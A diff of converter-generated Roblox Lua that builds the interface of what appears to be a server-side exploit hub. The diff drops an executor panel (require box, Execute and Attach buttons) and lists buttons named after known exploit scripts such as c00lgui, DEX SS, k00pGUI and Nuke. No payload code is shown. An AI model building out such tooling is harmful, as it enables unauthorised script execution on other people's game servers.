@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 193 | Scripts: 42 | Modules: 0 | Tags: 0
+-- Instances: 196 | Scripts: 42 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
@@ -91,13 +91,13 @@ G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["a"]["Position"] = UDim2.new(0.91646, 0, 0, 0);
 
 
--- StarterGui.ScreenGui.Frame.TextLabel.ImageButton.UIStroke
-G2L["b"] = Instance.new("UIStroke", G2L["a"]);
-
-
-
 -- StarterGui.ScreenGui.Frame.TextLabel.ImageButton.LocalScript
-G2L["c"] = Instance.new("LocalScript", G2L["a"]);
+G2L["b"] = Instance.new("LocalScript", G2L["a"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.TextLabel.ImageButton.UIStroke
+G2L["c"] = Instance.new("UIStroke", G2L["a"]);
 
 
 
@@ -251,7 +251,7 @@ G2L["1b"] = Instance.new("UIStroke", G2L["1a"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page2
+-- StarterGui.ScreenGui.Frame.page3
 G2L["1c"] = Instance.new("Frame", G2L["3"]);
 G2L["1c"]["Visible"] = false;
 G2L["1c"]["BorderSizePixel"] = 0;
@@ -259,197 +259,178 @@ G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
 G2L["1c"]["Size"] = UDim2.new(0, 361, 0, 260);
 G2L["1c"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
 G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1c"]["Name"] = [[page2]];
+G2L["1c"]["Name"] = [[page3]];
 G2L["1c"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.ScreenGui.Frame.page2.Text
-G2L["1d"] = Instance.new("ScrollingFrame", G2L["1c"]);
-G2L["1d"]["Active"] = true;
+-- StarterGui.ScreenGui.Frame.page3.TextLabel
+G2L["1d"] = Instance.new("TextLabel", G2L["1c"]);
+G2L["1d"]["TextWrapped"] = true;
 G2L["1d"]["BorderSizePixel"] = 0;
-G2L["1d"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
-G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(113, 113, 113);
-G2L["1d"]["Name"] = [[Text]];
-G2L["1d"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
-G2L["1d"]["Size"] = UDim2.new(1, 0, 0.83077, 0);
-G2L["1d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d"]["TextSize"] = 14;
+G2L["1d"]["TextScaled"] = true;
+G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d"]["TextColor3"] = Color3.fromRGB(171, 255, 0);
+G2L["1d"]["BackgroundTransparency"] = 1;
+G2L["1d"]["Size"] = UDim2.new(0, 361, 0, 29);
 G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1d"]["ScrollBarThickness"] = 2;
-G2L["1d"]["BackgroundTransparency"] = 0.5;
+G2L["1d"]["Text"] = [[Scripts (SERVER-SIDE)]];
 
 
--- StarterGui.ScreenGui.Frame.page2.Text.LocalScript
-G2L["1e"] = Instance.new("LocalScript", G2L["1d"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page2.Text.UIStroke
-G2L["1f"] = Instance.new("UIStroke", G2L["1d"]);
+-- StarterGui.ScreenGui.Frame.page3.TextLabel.UIStroke
+G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page2.Text.TextLabel
-G2L["20"] = Instance.new("TextLabel", G2L["1d"]);
-G2L["20"]["LineHeight"] = 1.01;
-G2L["20"]["BorderSizePixel"] = 0;
-G2L["20"]["TextSize"] = 14;
-G2L["20"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-G2L["20"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
-G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["20"]["TextColor3"] = Color3.fromRGB(191, 191, 191);
-G2L["20"]["BackgroundTransparency"] = 0.5;
-G2L["20"]["Size"] = UDim2.new(0, 28, 0, 216);
-G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["20"]["Text"] = [[1]];
-G2L["20"]["AutomaticSize"] = Enum.AutomaticSize.Y;
-G2L["20"]["Position"] = UDim2.new(0, 0, -0.00477, 0);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame
+G2L["1f"] = Instance.new("ScrollingFrame", G2L["1c"]);
+G2L["1f"]["Active"] = true;
+G2L["1f"]["BorderSizePixel"] = 0;
+G2L["1f"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
+G2L["1f"]["Size"] = UDim2.new(0, 361, 0, 231);
+G2L["1f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f"]["Position"] = UDim2.new(0, 0, 0.11154, 0);
+G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f"]["ScrollBarThickness"] = 3;
+G2L["1f"]["BackgroundTransparency"] = 11;
 
 
--- StarterGui.ScreenGui.Frame.page2.Text.TextLabel.y
-G2L["21"] = Instance.new("UIStroke", G2L["20"]);
-G2L["21"]["Name"] = [[y]];
-
-
--- StarterGui.ScreenGui.Frame.page2.Text.TextLabel.UIStroke
-G2L["22"] = Instance.new("UIStroke", G2L["20"]);
-G2L["22"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page2.Text.TextBox
-G2L["23"] = Instance.new("TextBox", G2L["1d"]);
-G2L["23"]["LineHeight"] = 1.01;
-G2L["23"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["23"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["23"]["BorderSizePixel"] = 0;
-G2L["23"]["TextSize"] = 14;
-G2L["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["23"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-G2L["23"]["BackgroundColor3"] = Color3.fromRGB(101, 101, 101);
-G2L["23"]["RichText"] = true;
-G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["23"]["AutomaticSize"] = Enum.AutomaticSize.Y;
-G2L["23"]["MultiLine"] = true;
-G2L["23"]["ClearTextOnFocus"] = false;
-G2L["23"]["PlaceholderText"] = [[-- require here]];
-G2L["23"]["Size"] = UDim2.new(0, 332, 0, 216);
-G2L["23"]["Position"] = UDim2.new(0.07756, 0, -0.00477, 0);
-G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["23"]["Text"] = [[]];
-G2L["23"]["BackgroundTransparency"] = 0.5;
-
-
--- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
-G2L["24"] = Instance.new("LocalScript", G2L["23"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.UIStroke
+G2L["20"] = Instance.new("UIStroke", G2L["1f"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page2.Text.TextBox.Completor
-G2L["25"] = Instance.new("LocalScript", G2L["23"]);
-G2L["25"]["Name"] = [[Completor]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.UIListLayout
+G2L["21"] = Instance.new("UIListLayout", G2L["1f"]);
+G2L["21"]["Padding"] = UDim.new(0, 1);
+G2L["21"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
--- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
-G2L["26"] = Instance.new("LocalScript", G2L["23"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["22"] = Instance.new("TextButton", G2L["1f"]);
+G2L["22"]["TextWrapped"] = true;
+G2L["22"]["BorderSizePixel"] = 0;
+G2L["22"]["TextSize"] = 14;
+G2L["22"]["TextScaled"] = true;
+G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["22"]["BackgroundTransparency"] = 1;
+G2L["22"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22"]["Text"] = [[c00lgui]];
 
 
-
--- StarterGui.ScreenGui.Frame.page2.Text.TextBox.UIStroke
-G2L["27"] = Instance.new("UIStroke", G2L["23"]);
-G2L["27"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["27"]["Thickness"] = 2;
-
-
--- StarterGui.ScreenGui.Frame.page2.Text.TextBox.y
-G2L["28"] = Instance.new("UIStroke", G2L["23"]);
-G2L["28"]["Name"] = [[y]];
-
-
--- StarterGui.ScreenGui.Frame.page2.Execute
-G2L["29"] = Instance.new("TextButton", G2L["1c"]);
-G2L["29"]["TextWrapped"] = true;
-G2L["29"]["BorderSizePixel"] = 0;
-G2L["29"]["TextSize"] = 14;
-G2L["29"]["TextScaled"] = true;
-G2L["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["29"]["BackgroundTransparency"] = 1;
-G2L["29"]["Size"] = UDim2.new(0, 89, 0, 41);
-G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["29"]["Text"] = [[Execute]];
-G2L["29"]["Name"] = [[Execute]];
-G2L["29"]["Position"] = UDim2.new(0, 0, 0.83846, 0);
-
-
--- StarterGui.ScreenGui.Frame.page2.Execute.UIStroke
-G2L["2a"] = Instance.new("UIStroke", G2L["29"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["23"] = Instance.new("LocalScript", G2L["22"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page2.Execute.UIStroke
-G2L["2b"] = Instance.new("UIStroke", G2L["29"]);
-G2L["2b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["2b"]["Thickness"] = 2;
-
-
--- StarterGui.ScreenGui.Frame.page2.Clear
-G2L["2c"] = Instance.new("TextButton", G2L["1c"]);
-G2L["2c"]["TextWrapped"] = true;
-G2L["2c"]["BorderSizePixel"] = 0;
-G2L["2c"]["TextSize"] = 14;
-G2L["2c"]["TextScaled"] = true;
-G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2c"]["BackgroundTransparency"] = 1;
-G2L["2c"]["Size"] = UDim2.new(0, 94, 0, 41);
-G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2c"]["Text"] = [[Clear]];
-G2L["2c"]["Name"] = [[Clear]];
-G2L["2c"]["Position"] = UDim2.new(0.24654, 0, 0.83846, 0);
-
-
--- StarterGui.ScreenGui.Frame.page2.Clear.UIStroke
-G2L["2d"] = Instance.new("UIStroke", G2L["2c"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["24"] = Instance.new("UIStroke", G2L["22"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page2.Clear.UIStroke
-G2L["2e"] = Instance.new("UIStroke", G2L["2c"]);
-G2L["2e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["2e"]["Thickness"] = 2;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["25"] = Instance.new("UIStroke", G2L["22"]);
+G2L["25"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.ScreenGui.Frame.page2.Inject
-G2L["2f"] = Instance.new("TextButton", G2L["1c"]);
-G2L["2f"]["TextWrapped"] = true;
-G2L["2f"]["BorderSizePixel"] = 0;
-G2L["2f"]["TextSize"] = 14;
-G2L["2f"]["TextScaled"] = true;
-G2L["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2f"]["BackgroundTransparency"] = 1;
-G2L["2f"]["Size"] = UDim2.new(0, 75, 0, 41);
-G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2f"]["Text"] = [[Attach]];
-G2L["2f"]["Name"] = [[Inject]];
-G2L["2f"]["Position"] = UDim2.new(0.50693, 0, 0.83846, 0);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["26"] = Instance.new("TextButton", G2L["1f"]);
+G2L["26"]["TextWrapped"] = true;
+G2L["26"]["BorderSizePixel"] = 0;
+G2L["26"]["TextSize"] = 14;
+G2L["26"]["TextScaled"] = true;
+G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["26"]["BackgroundTransparency"] = 1;
+G2L["26"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26"]["Text"] = [[DEX SS]];
 
 
--- StarterGui.ScreenGui.Frame.page2.Inject.UIStroke
-G2L["30"] = Instance.new("UIStroke", G2L["2f"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["27"] = Instance.new("LocalScript", G2L["26"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page2.Inject.UIStroke
-G2L["31"] = Instance.new("UIStroke", G2L["2f"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["28"] = Instance.new("UIStroke", G2L["26"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["29"] = Instance.new("UIStroke", G2L["26"]);
+G2L["29"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["2a"] = Instance.new("TextButton", G2L["1f"]);
+G2L["2a"]["TextWrapped"] = true;
+G2L["2a"]["BorderSizePixel"] = 0;
+G2L["2a"]["TextSize"] = 14;
+G2L["2a"]["TextScaled"] = true;
+G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2a"]["BackgroundTransparency"] = 1;
+G2L["2a"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a"]["Text"] = [[HD Admin]];
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["2c"] = Instance.new("UIStroke", G2L["2a"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["2d"] = Instance.new("UIStroke", G2L["2a"]);
+G2L["2d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["2e"] = Instance.new("TextButton", G2L["1f"]);
+G2L["2e"]["TextWrapped"] = true;
+G2L["2e"]["BorderSizePixel"] = 0;
+G2L["2e"]["TextSize"] = 14;
+G2L["2e"]["TextScaled"] = true;
+G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e"]["BackgroundTransparency"] = 1;
+G2L["2e"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e"]["Text"] = [[k00pGUI]];
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["2f"] = Instance.new("LocalScript", G2L["2e"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["30"] = Instance.new("UIStroke", G2L["2e"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["31"] = Instance.new("UIStroke", G2L["2e"]);
 G2L["31"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["31"]["Thickness"] = 2;
 
 
--- StarterGui.ScreenGui.Frame.page2.RE
-G2L["32"] = Instance.new("TextButton", G2L["1c"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["32"] = Instance.new("TextButton", G2L["1f"]);
 G2L["32"]["TextWrapped"] = true;
 G2L["32"]["BorderSizePixel"] = 0;
 G2L["32"]["TextSize"] = 14;
@@ -458,112 +439,88 @@ G2L["32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["32"]["BackgroundTransparency"] = 1;
-G2L["32"]["Size"] = UDim2.new(0, 58, 0, 41);
+G2L["32"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["32"]["Text"] = [[SPAWN]];
-G2L["32"]["Name"] = [[RE]];
-G2L["32"]["Position"] = UDim2.new(0.71468, 0, 0.83846, 0);
+G2L["32"]["Text"] = [[HappyHub]];
 
 
--- StarterGui.ScreenGui.Frame.page2.RE.UIStroke
-G2L["33"] = Instance.new("UIStroke", G2L["32"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["33"] = Instance.new("LocalScript", G2L["32"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page2.RE.UIStroke
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
 G2L["34"] = Instance.new("UIStroke", G2L["32"]);
-G2L["34"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["34"]["Thickness"] = 2;
-
-
--- StarterGui.ScreenGui.Frame.page2.R6
-G2L["35"] = Instance.new("TextButton", G2L["1c"]);
-G2L["35"]["TextWrapped"] = true;
-G2L["35"]["BorderSizePixel"] = 0;
-G2L["35"]["TextSize"] = 14;
-G2L["35"]["TextScaled"] = true;
-G2L["35"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["35"]["BackgroundTransparency"] = 1;
-G2L["35"]["Size"] = UDim2.new(0, 44, 0, 41);
-G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["35"]["Text"] = [[R6]];
-G2L["35"]["Name"] = [[R6]];
-G2L["35"]["Position"] = UDim2.new(0.87535, 0, 0.83846, 0);
-
-
--- StarterGui.ScreenGui.Frame.page2.R6.UIStroke
-G2L["36"] = Instance.new("UIStroke", G2L["35"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page2.R6.UIStroke
-G2L["37"] = Instance.new("UIStroke", G2L["35"]);
-G2L["37"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["37"]["Thickness"] = 2;
-
-
--- StarterGui.ScreenGui.Frame.page3
-G2L["38"] = Instance.new("Frame", G2L["3"]);
-G2L["38"]["Visible"] = false;
-G2L["38"]["BorderSizePixel"] = 0;
-G2L["38"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
-G2L["38"]["Size"] = UDim2.new(0, 361, 0, 260);
-G2L["38"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
-G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["38"]["Name"] = [[page3]];
-G2L["38"]["BackgroundTransparency"] = 0.5;
-
-
--- StarterGui.ScreenGui.Frame.page3.TextLabel
-G2L["39"] = Instance.new("TextLabel", G2L["38"]);
-G2L["39"]["TextWrapped"] = true;
-G2L["39"]["BorderSizePixel"] = 0;
-G2L["39"]["TextSize"] = 14;
-G2L["39"]["TextScaled"] = true;
-G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["39"]["TextColor3"] = Color3.fromRGB(171, 255, 0);
-G2L["39"]["BackgroundTransparency"] = 1;
-G2L["39"]["Size"] = UDim2.new(0, 361, 0, 29);
-G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["39"]["Text"] = [[Scripts (SERVER-SIDE)]];
-
-
--- StarterGui.ScreenGui.Frame.page3.TextLabel.UIStroke
-G2L["3a"] = Instance.new("UIStroke", G2L["39"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame
-G2L["3b"] = Instance.new("ScrollingFrame", G2L["38"]);
-G2L["3b"]["Active"] = true;
-G2L["3b"]["BorderSizePixel"] = 0;
-G2L["3b"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
-G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["3b"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
-G2L["3b"]["Size"] = UDim2.new(0, 361, 0, 231);
-G2L["3b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3b"]["Position"] = UDim2.new(0, 0, 0.11154, 0);
-G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3b"]["ScrollBarThickness"] = 3;
-G2L["3b"]["BackgroundTransparency"] = 11;
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.UIStroke
-G2L["3c"] = Instance.new("UIStroke", G2L["3b"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.UIListLayout
-G2L["3d"] = Instance.new("UIListLayout", G2L["3b"]);
-G2L["3d"]["Padding"] = UDim.new(0, 1);
-G2L["3d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["35"] = Instance.new("UIStroke", G2L["32"]);
+G2L["35"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["3e"] = Instance.new("TextButton", G2L["3b"]);
+G2L["36"] = Instance.new("TextButton", G2L["1f"]);
+G2L["36"]["TextWrapped"] = true;
+G2L["36"]["BorderSizePixel"] = 0;
+G2L["36"]["TextSize"] = 14;
+G2L["36"]["TextScaled"] = true;
+G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["36"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["36"]["BackgroundTransparency"] = 1;
+G2L["36"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["36"]["Text"] = [[RC7]];
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["37"] = Instance.new("LocalScript", G2L["36"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["38"] = Instance.new("UIStroke", G2L["36"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["39"] = Instance.new("UIStroke", G2L["36"]);
+G2L["39"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["3a"] = Instance.new("TextButton", G2L["1f"]);
+G2L["3a"]["TextWrapped"] = true;
+G2L["3a"]["BorderSizePixel"] = 0;
+G2L["3a"]["TextSize"] = 14;
+G2L["3a"]["TextScaled"] = true;
+G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3a"]["BackgroundTransparency"] = 1;
+G2L["3a"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3a"]["Text"] = [[KJ]];
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["3c"] = Instance.new("UIStroke", G2L["3a"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["3d"] = Instance.new("UIStroke", G2L["3a"]);
+G2L["3d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["3e"] = Instance.new("TextButton", G2L["1f"]);
 G2L["3e"]["TextWrapped"] = true;
 G2L["3e"]["BorderSizePixel"] = 0;
 G2L["3e"]["TextSize"] = 14;
@@ -574,7 +531,7 @@ G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["3e"]["BackgroundTransparency"] = 1;
 G2L["3e"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3e"]["Text"] = [[c00lgui]];
+G2L["3e"]["Text"] = [[Nuke]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -593,7 +550,7 @@ G2L["41"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["42"] = Instance.new("TextButton", G2L["3b"]);
+G2L["42"] = Instance.new("TextButton", G2L["1f"]);
 G2L["42"]["TextWrapped"] = true;
 G2L["42"]["BorderSizePixel"] = 0;
 G2L["42"]["TextSize"] = 14;
@@ -604,7 +561,7 @@ G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["42"]["BackgroundTransparency"] = 1;
 G2L["42"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["42"]["Text"] = [[DEX SS]];
+G2L["42"]["Text"] = [[c00lkidd music]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -623,7 +580,7 @@ G2L["45"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["46"] = Instance.new("TextButton", G2L["3b"]);
+G2L["46"] = Instance.new("TextButton", G2L["1f"]);
 G2L["46"]["TextWrapped"] = true;
 G2L["46"]["BorderSizePixel"] = 0;
 G2L["46"]["TextSize"] = 14;
@@ -634,7 +591,7 @@ G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["46"]["BackgroundTransparency"] = 1;
 G2L["46"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
